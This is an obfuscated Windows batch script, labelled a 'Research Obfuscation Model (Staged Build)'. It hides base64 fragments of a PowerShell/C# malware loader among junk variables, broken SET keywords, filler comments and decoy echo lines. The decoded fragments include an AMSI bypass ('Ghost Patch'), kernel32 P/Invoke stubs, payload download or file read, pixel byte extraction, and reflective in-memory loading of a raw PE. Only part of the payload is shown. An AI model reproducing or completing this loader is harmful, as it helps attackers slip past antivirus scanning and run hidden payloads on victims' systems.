@echo off
set XuVjJWQNx=
set XwxjvIBgpIDVyXZ=
set XxqKiakplPanjfo=
set YDUeHDw=
set YHqvCkXQZ=
set YTbRjWexj=
set YTgcx=
set YYLkrLaycSYPjE=
set YdAtBwXU=
set YdL=
set YdefpMIbccP=
set YhaCdnKj=
set YhbcVoTeNKtFA=
set YjU=
set Yjs=
set YmcCIqAENtAlY=
set YnMTvkKvsbgmnq=
set YwHLWHAUicRRw=
set ZAxNDPzuFPnspEc=
set ZDcM=
set ZEezrXAImeK=
set ZFZs=
set ZGnB=
set ZHn=
set ZKT=
set ZPEXPpKfHHh=
set ZPhs=
set ZRmANmsthO=
set ZSYz=
set ZTo=
set ZTt=
set ZXW=
set ZawdeyUWFAf=
set ZjCBNFggmJUnt=
set ZkXb=
set ZppEHfjvvXvXL=
set ZrPPFL=
set ZuZ=
set ZvG=
set Zvk=
set ZxNZ=
set ZyuEl=
set aBLmvthbaI=
set aCkRUWgSCOjDCmv=
set aKVRhmxWuVOavL=
set aMjRnIU=
set aNZnNQrmE=
set aTuH=
set aYGGYyiHZf=
set aeuL=
set ahDAYWwcTnf=
set aiBYrSKEh=
set aiHlLaGZCPyD=
set almL=
set aoaqkh=
set aqLiT=
set auV=
set bBFOvHFAP=
set bCKbnMKkRoxx=
set bEc=
set bHaC=
set bLc=
set bLtJuZADs=
set bOvn=
set bQzPKhKldniqSfB=
set bRVyL=
set bVi=
set bXJnf=
set bXr=
set bayOqyi=
set bdenHdObq=
set bfdkmWMdEjHov=
set bflns=
set bjmgMnpYnN=
set blcoCBD=
set bnHVFaB=
set brCXUfklyVpV=
set bsVAR=
set btjM=
set bvmS=
set bwUzk=
set bxf=
set bxi=
set cAySgAFayf=
set cGBISifOeu=
set cGGXDQKtTryAYQd=
set cHvMm=
set cIVBW=
set cKLct=
set cQHnab=
set cUK=
set cVm=
set cZOUc=
set clBT=
set cncxXRjT=
set crdd=
set csx=
set cunVdWCtvaSrinI=
set cyBeVfvxiWDgW=
set czDW=
set dCcH=
set dHUGcBMESwqhVa=
set dHZMH=
set dKXkp=
set dLbFUYl=
set dMkLyrm=
set dMn=
set dMpyaUf=
set dOHt=
set dRV=
set dXQozcjZcYLKq=
set dZKq=
set dgcMcdoZQlsPG=
set diOaid=
set diQYY=
set dkczwO=
set dmS=
set dqLdyLGErfhw=
set dqtQ=
set dwCP=
set dyeLF=
set dyrhRJEW=
set dzvr=
set eCi=
set eDVp=
set eHQgk=
set eMV=
set eXHkX=
set eXuu=
set egH=
set eoSaDpPdhy=
set ewva=
set fDjj=
set fDyyYa=
set fFZVjbJTcE=
set fKddDLcuP=
set fLBvrUfBOeD=
set fSEKgZYWylNQ=
set fTLqVDPQP=
set fTwrpm=
set fUOM=
set fYqlbAiW=
set faA=
set fhZKGpvlYRmVqJ=
set fjpgOza=
set fqsh=
set frLFsTK=
set fwGOF=
set gJtxt=
set gKfkfgFBgdTxB=
set gLUCy=
set gMPQfVCFkLWdnf=
set gNMJJyZ=
set gNjys=
set gOFm=
set gPuXWe=
set gQcpT=
set gSqBXK=
set gcAse=
set gjQIJvrgGHfd=
set gpE=
set gtoHkK=
set guP=
set gvWCzdkRihQqpr=
set gvszmMoWlT=
set hDP=
set hNGm=
set hOwYcPqoh=
set hQsSGJRzZw=
set hSoEOVNaQVpGOo=
set hbIYnyWzHKmj=
set hes=
set hew=
set hhUd=
set hjIDUVcAAIDE=
set hnFyMi=
set hooadn=
set htUOryLf=
set huNHEPBzHTm=
set iCC=
set iCwfY=
set iDoXJzEoFD=
set iFg=
set iQDxx=
set iRfIPa=
set iSM=
set iXwV=
set iZTOT=
set iZcFLjnt=
set iZl=
set ibOvj=
set ibaBr=
set idK=
set iiS=
set ikzht=
set isqtQt=
set itD=
set iwYFfRasTwP=
set ixo=
set iyy=
set jFyHP=
set jGKuoIwUMBqKg=
set jOyX=
set jSKNlYhh=
set jVYr=
set jWHXg=
set jaq=
set jhRoyxfh=
set jhW=
set jjFaCgThRr=
set jlcT=
set joyuVWGUOYntRY=
set jpLGc=
set jqsGI=
set jsGQS=
set juHX=
set juxAbyoYTzC=
set kAvIhkHVof=
set kGyMOp=
set kMMiY=
set kXUhk=
set kYw=
set kZwrcEsZTNirVKj=
set kanCkYs=
set kga=
set kgnjX=
set kjYrQ=
set kmIED=
set kqP=
set kqkXe=
set kwjHfIrby=
set kyQL=
set lAecuMLnENLj=
set lAoEszF=
set lGR=
set lHdxtXRDlvVN=
set lLmOLeUlEXYYhE=
set lMHqS=
set lMcD=
set lNrInsfOlDkULDi=
set lXBnIiBkqJfC=
set lpFUgGkPFPKZSkI=
set lvB=
set lxillkTzpl=
set lzNx=
set mDauwGWgaSpEaNH=
set mFgLgVWtdE=
set mIFPpGFbMENKvmB=
set mNLt=
set mNeQsxzd=
set mWlaVdQjsKwL=
set mXzWeQE=
set mYaOUPPXMjpZatA=
set maGl=
set mbERUxWKEebJP=
set mbjdv=
set mbkRPUeQmCyM=
set miOni=
set mjusnIzLlkGkPRf=
set mmAnmoYx=
set mpIhpYQSrfYj=
set mxbcH=
set nBkTC=
set nCOQaDkNEltJSQ=
set nGyE=
set nHmUh=
set nLTcyUukMGBIXl=
set nLU=
set nLWlAjHQlweq=
set nRiVznteQWwuM=
set nXAMc=
set nXk=
set nXuy=
set nbi=
set ndoh=
set nfVIGErDWAVZT=
set nkmvnkeYQUhwpCx=
set nmPWq=
set ntv=
set nuBJwHJc=
set nuzQ=
set nwupuFSobO=
set oCRFGg=
set oECktnjKeya=
set oGEE=
set oIx=
set oJYXCV=
set oOkXU=
set oTKFheduBU=
set oYJQQvYsoCYdQub=
set oZRFFswKBo=
set odGsiCGnfRjqSoY=
set ogFSq=
set ogM=
set oliK=
set omWcCk=
set omzR=
set orK=
set oxVY=
set pBOwFlSkJampS=
set pGFfuNUrmKOej=
set pLP=
set pNTnF=
set pOfiHlDyaHQ=
set pRy=
set pSvAx=
set pYNZ=
set pbXOVWDEqz=
set pdQOMelFjS=
set pk_UABV_0000=
set pk_UABV_0001=
set pk_UABV_0002=
set pk_UABV_0003=
set pk_UABV_0004=
set pk_UABV_0005=
set pk_UABV_0006=
set pk_UABV_0007=
set pk_UABV_0008=
set pk_UABV_0009=
set pk_UABV_0010=
set pk_UABV_0011=
set pk_UABV_0012=
set pk_UABV_0013=
set pk_UABV_0014=
set pk_UABV_0015=
set pk_UABV_0016=
set pk_UABV_0017=
set pk_UABV_0018=
set pk_UABV_0019=
set pk_UABV_0020=
set pk_UABV_0021=
set pk_UABV_0022=
set pk_UABV_0023=
set pk_UABV_0024=
set pk_UABV_0025=
set pk_UABV_0026=
set pk_UABV_0027=
set pk_UABV_0028=
set pk_UABV_0029=
set pk_UABV_0030=
set pk_UABV_0031=
set pk_UABV_0032=
set pk_UABV_0033=
set pk_UABV_0034=
set pk_UABV_0035=
set pk_UABV_0036=
set pk_UABV_0037=
set pk_UABV_0038=
set pk_UABV_0039=
set pk_UABV_0040=
set pk_UABV_0041=
set pk_UABV_0042=
set pk_UABV_0043=
set pk_UABV_0044=
set pk_UABV_0045=
set pk_UABV_0046=
set pk_UABV_0047=
set pk_UABV_0048=
set pxBN=
set pyoqGnpp=
set pzpzB=
set qAbq=
set qCLzLJIuvJuFfta=
set qDm=
set qHqKka=
set qIBUPIznEF=
set qKds=
set qLeEw=
set qTZy=
set qTcs=
set qUrxPqfMiV=
set qYCZFlQiMAQs=
set qbRURWmvbuOa=
set qcTQJVhHdi=
set qkGsKa=
set qlVOAy=
set qqRRuGuIQY=
set qsYGlzSEtR=
set qvHnFXdWxrSPcRT=
set rBYvdHkPoh=
set rDH=
set rEEtunE=
set rGIx=
set rIVbILi=
set rJAxgkLrnuGffon=
set rOWaZW=
set rVcOXOimOMDFnk=
set rVrl=
set rgPNwf=
set rgfZlCNQaEOU=
set riIpH=
set rieWFzqzmKgyekv=
set rku=
set rlFwoaZKgYdY=
set rmJoQHwrtzC=
set roV=
set roZWVLyCINvi=
set rpBXa=
set ruJ=
set ruZTT=
set rxy=
set sGADnabeEjR=
set sGZdGyWVgeA=
set sGtfsbpsUx=
set sKxCwitzyHIpRov=
set sOlU=
set sSTZaVZBtpwUD=
set sTL=
set sXe=
set scgwi=
set sft=
set shCj=
set shvUwUh=
set siCCwtcSB=
set sintyaxLk=
set skYDXgEdZtZHaqQ=
set snOpm=
set sqrn=
set stMis=
set suHuIkWEQX=
set swoMtUkPpt=
set sxQsYIAgwYX=
set tBVHl=
set tGhTpcbwKqFaY=
set tOuVkwrevN=
set tQNlu=
set tdBegOJZxf=
set tfXnJqCKJSubAE=
set thALr=
set tmwqf=
set tnUf=
set tndMupC=
set tpxpYKOhcrDqBAW=
set uBo=
set uCZRpwyKkdow=
set uHjpeKed=
set uJPMk=
set uKKPi=
set uKqTy=
set uSSTB=
set uTcEhYDNTc=
set uTuE=
set uVm=
set uWCh=
set uaWY=
set ucKgPPrPvdsuPS=
set uckj=
set unvwWQ=
set upOXAVF=
set uqH=
set uqO=
set vDGcgP=
set vMbRr=
set vSFt=
set vVcn=
set vbyEPKK=
set vgg=
set vtAAwBYDtuQCDw=
set vtE=
set vxnK=
set vzAlYkfdWKtW=
set wCh=
set wFRDC=
set wIgiZGfcXnJCOJI=
set wPdOzNy=
set wRN=
set wTnS=
set wVdzDYFuyEWId=
set wWXBL=
set whmGX=
set wjCA=
set wkLVCYIoo=
set wrt=
set wsrzpAmJFj=
set wvXQ=
set wvY=
set wyksthQls=
set wzo=
set xBVPV=
set xBZUDXiwFymYk=
set xByhW=
set xCql=
set xJoHQ=
set xLk=
set xRreEwrlyHJbRqq=
set xYVr=
set xbseTBgRdMZkmsb=
set xdtK=
set xvdum=
set yAuEa=
set yBAv=
set yBw=
set yDB=
set yNU=
set yZf=
set ydTX=
set yewMfLEz=
set yfLq=
set yiCVDAcOP=
set ylogmR=
set yoabHeBcONGxVS=
set yrZLN=
set ythpmiEc=
set yvpLHNdLQemGnFN=
set zIiAnVuJSatRvwA=
set zKpQ=
set zQf=
set zUVIz=
set zVOqQz=
set zWPbeWRCZwxk=
set zYjvk=
set zYt=
set zZk=
set zgd=
set zjDEnzcr=
set zkxlQIAhQG=
set zlJu=
set zliqyKx=
set zmtY=
set ztxUoOtCOMRaHq=
set zvx=
set zwBX=

REM --- Research Obfuscation Model (Staged Build) ---
sE%EZItC%T "pk_UABV_0005=FN5c3RlbTsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwpwdWJsaWMgY2xhc3MgJGNsYXNzTmFtZSB7CltEbGxJbXBvcnQoImtlcm5lbDMyIildIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRNb"
REM clearing sword beacon ruby strobe pixel twilight twilight guard glimmer
REM binary guard vertex delta
se%Srcb%T "JmEBSAUmJBhTWX=xdZIycghcZkLUMcsCjKgRIbRPPvhJ"
SE%JLob%T "gMPQfVCFkLWdnf=MuuvFlrOpGmYBknhPGRtifQbenzmv"
sE%ATr%t "JYWJvbtxnVhkxGk=IquOCnrUoTKPdsFSeeKCDzrBkJVnggqoMOF"
REM mirage delta clearing kappa mirage strobe strobe pixel sword
REM ruby sword sword odyssey valley
REM beacon kappa fathom circle cipher valley ruby
echo d3BtRXFOVTJ4MWJEaThESkpPbXM0RGdtNGloN0hMZ0U3VHFzT3BmWEtUaDU3NklnekFzbGpmbUpQelNlRnI5T1pj >nul 2>&1
Se%jsGQS%T "pk_UABV_0034=gTGVuZ3RoOiAkbGVuZ3RoIGJ5dGVzIgokZXh0cmFjdGVkID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W2J5dGVdCiRkb25lID0gJGZhbHNlCmZvciAoJHkgPSAwOyAkeSAtbHQgJGg7ICR5KyspIHsK"
SE%Adu%T "vDGcgP=FhkaYWGvilIdXctttM"
echo Rk0xbnlrU29ldlZtOGEwS08yVVBsUXJjeWdZUThXc3RicGFWODdnUGFaQWJBTUE= >nul 2>&1
Se%pSvAx%t "SCMSbLBspQ=osnvLOAjNodqUuICNJ"
echo R1dJRmxxSHQyTU5SZlQwek9qT0w4V3dBVDZvMWdqbVJZNmlsc3BLbE1YQjBtZ05FNEw= >nul 2>&1
REM vision vertex valley kappa odyssey cipher circle circle binary
REM lance beacon pixel pixel sword core kiln core beacon zenith
se%eXuu%t "pk_UABV_0044=MoKS5Db3VudCAtZXEgMSkKfSB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEKJGxvYWRlZCA9ICRsb2FkTWV0aG9kLkludm9rZSgkbnVsbCwgKCwkcmF3UEUpKQpMb2ctU2lsZW50ICJbK10gQXNzZW1ibHkgTG9hZGVkOiAkKCR"
SE%Jpz%T "nfVIGErDWAVZT=AgNUFBZddJmTZsuvlYzkVTkcXCiYVKiAQ"
se%nmPWq%t "cAySgAFayf=meZQJWkoxnapYOHxONrkEyTRak"
REM fragment cipher fragment beacon beacon twilight strobe
REM zenith cipher circle circle odyssey binary core shadow
REM fathom lance sword sword sword shadow phantom vision vertex
SE%AOOZ%T "pk_UABV_0002=kgewpMb2ctU2lsZW50ICJbKl0gQXR0ZW1wdGluZyBHaG9zdCBQYXRjaC4uLiIgIkdyYXkiCnRyeSB7CiRwID0gW1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHMnKQppZiAoJH"
REM delta shadow twilight clearing kiln circle
echo OTNMWHNiWG5oUTQwekpQajhkNHdkeWQ3RDNFMk9nTUQ2U004bUxNYVlrSlF1bXc5ZjZSU3VQQ0NtOW5hbGtqVFVMSDFabmlydlN4 >nul 2>&1
se%oxVY%T "nkmvnkeYQUhwpCx=vwMJRgeuuSmGPErRBoUKTQaIrgu"
se%uTuE%t "dXQozcjZcYLKq=qlZVVkSkIfsOYcHsWutOqwMHoxqVNhY"
se%sXe%t "NpDeZwVjy=IWhasUAfeWEEohslc"
echo VUtxTU5Yb0Q1dzdhUFNLcE1GVjJjOVZMaVNXY1kzajc5ZDJlN051Zmc= >nul 2>&1
Se%zUVIz%T "dgcMcdoZQlsPG=WrvAFytXBJDsV"
Se%TXQ%t "BbQdjgshfUtGWw=OoccXjSpDphhsyyYYXFL"
Se%wvXQ%t "PgyfNF=FNERTDLkxxNBHFFk"
REM vertex beacon strobe glimmer strobe phantom sword
Se%bvmS%T "SEHfoFLstVJrWli=rjSdDtqlNLMKeX"
SE%dzvr%t "rmJoQHwrtzC=rXcecWHZyGgWvkTMcgOFEW"
sE%clBT%T "mXzWeQE=zoeMUanAecHs"
sE%SpSJ%T "LRcddbFiGV=PrCZoTkRbusaJzgBNgRGq"
echo OWZEZmVIa1FEYUpPVU5wZ2h4NElTVDFWMkphb21UQnJ5WHFST0l0dTRBcFpJQ0ZaUDZOZUR2VkVmRGxURHdxV3hScG1mRGNGeng= >nul 2>&1
REM phantom fathom sword phantom cipher binary hawk delta
REM lance hawk phantom
REM ruby pixel binary vision valley twilight
REM odyssey hawk circle vertex hawk twilight sword
se%bXr%t "fDyyYa=dvisoQfVbVsTvMSPzhMefeIgbnbc"
REM undergrowth undergrowth kappa guard shadow cipher strobe shadow twilight
echo STRUMjBmd3dzSk0zY1ZDckJnc2ZFZU55YzAyMlpHV0pFbEtXMEYyMUs0bzZ5WUQxb0FxRkE2dHVMemR2dW9PY1BqRWk1 >nul 2>&1
sE%IOUiN%t "mbkRPUeQmCyM=QffAsTsPOkbnClWubeyWnHUEMtfcJjT"
se%Rzav%t "tfXnJqCKJSubAE=YFmadBLWEy"
Se%ogM%t "WcOuZsqAYuXGh=mSexhnOVlzwO"
SE%oIx%t "tGhTpcbwKqFaY=MdpddlxRyCwgjKU"
REM ruby vision valley mirage glimmer valley
Se%stMis%t "hnFyMi=NFmWmbbWIHwPJHIHOCmi"
REM undergrowth vision vertex echo odyssey
sE%gOFm%t "mWlaVdQjsKwL=dHtiuPdpOJhdFRavAVjZAaABdGiEp"
se%ZTo%T "HptznCTcILKRSyh=CAhIjUQbTdylIaPpukPMmMrflqzOBVYOtxO"
SE%uqH%T "HBtBLIQUCzA=jtfMlHuAYZYfhtvJmlkuWEidMVxkunCfI"
echo RmY1OTJwTGUwYkNicmZZd0hFNFI2a0g0d2xyNm5kb3F5WDhWSk1Da1BuRw== >nul 2>&1
SE%bOvn%T "oTKFheduBU=cWKsVCLlfXeEldNbBbksYt"
Se%BVwUV%T "pk_UABV_0030=A9ICR3Yy5Eb3dubG9hZERhdGEoJFNvdXJjZSkKJHdjLkRpc3Bvc2UoKQp9IGVsc2VpZiAoVGVzdC1QYXRoICRTb3VyY2UpIHsKJGRhdGEgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxs"
sE%jhW%t "rOWaZW=SjOpIfcdJdWziQIMQO"
echo WTZobXd4TUk5Nk42eHRmUnRERjVHRXM3NDBCZVFCRnRxODJvNXhPd0tjQkhUckxUcnZ2bWF3T0ZwMzRMdm9Nbg== >nul 2>&1
SE%aTuH%t "htUOryLf=qApZUWBJclQGpHHFiIbqfCsjfjKgCU"
REM ruby fragment zenith cipher delta
REM hawk kiln lance ruby core core zenith fathom hawk
REM vision zenith ruby
REM twilight pixel valley kiln odyssey sword
SE%ZFZs%T "ZEezrXAImeK=MfsHqGwatcBAqiIPkMfSRYQhtgtfArbgyu"
SE%Nznug%t "TwNDZlntewoEmh=WZtNgMjhwZZsAcrZgzmwVrvuD"
REM zenith twilight vertex twilight binary fragment guard vertex guard
echo NWZFTmtWaFBkcFk4QnowbTllVHFxVkVDTUl4V3IzY3JXU2ViNURYWmljdUpDQTE= >nul 2>&1
Se%LdYo%t "NPUZdCeeQMS=dUUxthBKPVhZEbBBAPKGzyBN"
echo NjZ0S2J6dEdjdVpWRTVvY1JHeGVvSzZBMzVlOFJrSGdnV0ZOTVp4WUlBTnFnMlJzQVhIMk1ISk1UQ256SWZ5M0VUTzBIMlQzdVo2 >nul 2>&1
echo QkJoWDdPZmh5UGY1MXdDYkhtMVV1V0pMQ1NZcHRRUnlPdkJKbldieg== >nul 2>&1
echo RVc5dndBRzNxYVp3cE1LdDBaNjFWT0hHVGQ3M1Q2OWRJNk4zU3NwSU1NTnJvWVhVZ2JkaEdmbXVYU2tIMFY4dnJi >nul 2>&1
REM fragment binary lance cipher hawk vision sword fragment hawk
Se%ZuZ%t "CaBPIaO=xAkDTIWEmWWpFM"
sE%almL%T "VItFQtmRbYfHKHQ=mSIrbPFejEiGGclawXmKBlcl"
REM guard guard fragment phantom
REM fathom sword vision
REM pixel fathom cipher kiln undergrowth fragment
REM vision lance core pixel circle
REM lance fathom twilight undergrowth
sE%AhjW%T "pBOwFlSkJampS=kpFYKJUurYyiSFcWHkZVPePSzXgKvNO"
sE%zlJu%T "joyuVWGUOYntRY=VZygOtJcjuHZJBMtMlbCUyomQBFrW"
SE%zYt%T "xBZUDXiwFymYk=kCFGXxTZcRhHqgiiILICfHbmGug"
REM valley glimmer strobe mirage hawk
se%ATqF%T "dMpyaUf=bopUfcMwLmcTspNw"
REM beacon shadow odyssey valley twilight
Se%wjCA%t "DBmWkTDsUHAbem=tYzVLpCZjp"
se%iFg%T "MVKyUNtwgSK=WhHTlFXcZLhJBFwHVAtcIXlTzsHfkoY"
REM ruby phantom ruby twilight valley odyssey shadow binary
SE%YTgcx%T "JRHGnD=WNheePawhFmbRLZAhHvCXHipdiGogfs"
REM shadow delta shadow lance beacon
se%QIPrQ%t "aiHlLaGZCPyD=xFwIALDnOiIhMLJhfiNWwQSXBcsbQx"
sE%zYjvk%t "UdQTKBgqzmbI=VTEVKfyNpmyfUaj"
Se%VzaYB%t "WfgCnS=nuFYlHOamQkKB"
REM beacon twilight ruby
sE%FNuIq%t "aNZnNQrmE=GXPbfXwWLDpHiUwgFgFfXtGYPbkunL"
